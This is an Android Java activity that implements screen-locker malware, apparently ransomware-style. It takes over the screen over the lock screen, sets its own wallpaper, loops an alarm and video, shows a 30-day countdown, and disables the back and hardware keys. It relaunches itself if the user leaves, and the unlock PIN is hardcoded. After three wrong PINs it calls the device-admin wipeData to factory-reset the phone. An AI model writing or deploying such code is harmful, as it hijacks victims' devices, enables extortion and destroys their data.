package com.deep.alzz.ai;

import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.graphics.BitmapFactory;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.TextView;
import android.widget.VideoView;
import androidx.appcompat.app.AppCompatActivity;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.Timer;
import java.util.TimerTask;

public class LockActivity extends AppCompatActivity {

    private static final String CORRECT_PIN = "1945";
    private static final int MAX_ATTEMPTS = 3;

    private StringBuilder pin = new StringBuilder();
    private TextView[] pinBoxes = new TextView[4];
    private TextView statusText, timerText;
    private int attempts = 0;
    private long lockTime = System.currentTimeMillis();
    private Timer timer;
    private MediaPlayer mediaPlayer;
    private VideoView videoView;
    private boolean unlocked = false;

    private DevicePolicyManager dpm;
    private ComponentName adminComponent;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );

        // Max brightness
        WindowManager.LayoutParams lp = getWindow().getAttributes();
        lp.screenBrightness = 1.0f;
        getWindow().setAttributes(lp);

        setContentView(R.layout.activity_lock);

        dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);

        pinBoxes[0] = findViewById(R.id.pin1);
        pinBoxes[1] = findViewById(R.id.pin2);
        pinBoxes[2] = findViewById(R.id.pin3);
        pinBoxes[3] = findViewById(R.id.pin4);
        statusText   = findViewById(R.id.status_text);
        timerText    = findViewById(R.id.timer_text);
        videoView    = findViewById(R.id.video_view);

        setWallpaper();
        playVideo();
        playSound();
        startTimer();
        updatePinDisplay();
    }

    private void setWallpaper() {
        try {
            InputStream is = getAssets().open("wall.jpg");
            WallpaperManager.getInstance(this).setBitmap(
                BitmapFactory.decodeStream(is)
            );
            is.close();
        } catch (Exception ignored) {}
    }

    private void playVideo() {
        try {
            File outFile = new File(getCacheDir(), "video.mp4");
            if (!outFile.exists()) {
                InputStream is = getAssets().open("video.mp4");
                FileOutputStream fos = new FileOutputStream(outFile);
                byte[] buf = new byte[4096]; int len;
                while ((len = is.read(buf)) != -1) fos.write(buf, 0, len);
                is.close(); fos.close();
            }
            videoView.setVideoURI(Uri.fromFile(outFile));
            videoView.setOnPreparedListener(mp -> { mp.setLooping(true); videoView.start(); });
            videoView.start();
        } catch (Exception e) {
            videoView.setVisibility(View.GONE);
        }
    }

    private void playSound() {
        try {
            android.content.res.AssetFileDescriptor afd = getAssets().openFd("alarm.mp3");
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(afd.getFileDescriptor(), afd.getStartOffset(), afd.getLength());
            mediaPlayer.setLooping(true);
            mediaPlayer.prepare();
            mediaPlayer.start();
        } catch (Exception ignored) {}
    }

    private void startTimer() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override public void run() {
                runOnUiThread(() -> {
                    long elapsed   = System.currentTimeMillis() - lockTime;
                    long remaining = 30L * 24 * 60 * 60 * 1000 - elapsed;
                    if (remaining <= 0) { timerText.setText("TIME'S UP!"); return; }
                    long d = remaining / (24*60*60*1000);
                    long h = (remaining % (24*60*60*1000)) / (60*60*1000);
                    long m = (remaining % (60*60*1000)) / (60*1000);
                    long s = (remaining % (60*1000)) / 1000;
                    timerText.setText(String.format("%d DAYS %02d:%02d:%02d", d, h, m, s));
                });
            }
        }, 0, 1000);
    }

    private void updatePinDisplay() {
        for (int i = 0; i < 4; i++) {
            if (i < pin.length()) {
                pinBoxes[i].setText("●");
                pinBoxes[i].setBackgroundResource(R.drawable.pin_filled);
            } else {
                pinBoxes[i].setText("");
                pinBoxes[i].setBackgroundResource(R.drawable.pin_empty);
            }
        }
    }

    public void onDigitClick(View v) {
        if (pin.length() >= 4) return;
        pin.append(v.getTag().toString());
        updatePinDisplay();
        if (pin.length() == 4) checkPin();
    }

    public void onDeleteClick(View v) {
        if (pin.length() > 0) {
            pin.deleteCharAt(pin.length() - 1);
            updatePinDisplay();
        }
    }

    private void checkPin() {
        if (pin.toString().equals(CORRECT_PIN)) {
            unlocked = true;
            if (timer != null) timer.cancel();
            if (mediaPlayer != null) { try { mediaPlayer.stop(); mediaPlayer.release(); } catch (Exception ignored) {} }
            if (videoView != null) videoView.stopPlayback();
            stopService(new Intent(this, LockService.class));
            finish();
        } else {
            attempts++;
            int left = MAX_ATTEMPTS - attempts;
            if (left <= 0) {
                doFactoryReset();
            } else {
                statusText.setText("WRONG! " + left + " ATTEMPTS LEFT");
                pin.setLength(0);
                updatePinDisplay();
            }
        }
    }

    private void doFactoryReset() {
        statusText.setText("WIPING DEVICE...");
        new Timer().schedule(new TimerTask() {
            @Override public void run() {
                try {
                    if (dpm.isAdminActive(adminComponent)) {
                        dpm.wipeData(0);
                    }
                } catch (Exception ignored) {}
            }
        }, 2000);
    }

    @Override public boolean onKeyDown(int keyCode, KeyEvent event) { return true; }
    @Override public void onBackPressed() {}

    @Override
    protected void onPause() {
        super.onPause();
        if (!unlocked) {
            Intent i = new Intent(this, LockActivity.class);
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
            startActivity(i);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (timer != null) timer.cancel();
        try { if (mediaPlayer != null) mediaPlayer.release(); } catch (Exception ignored) {}
    }
}
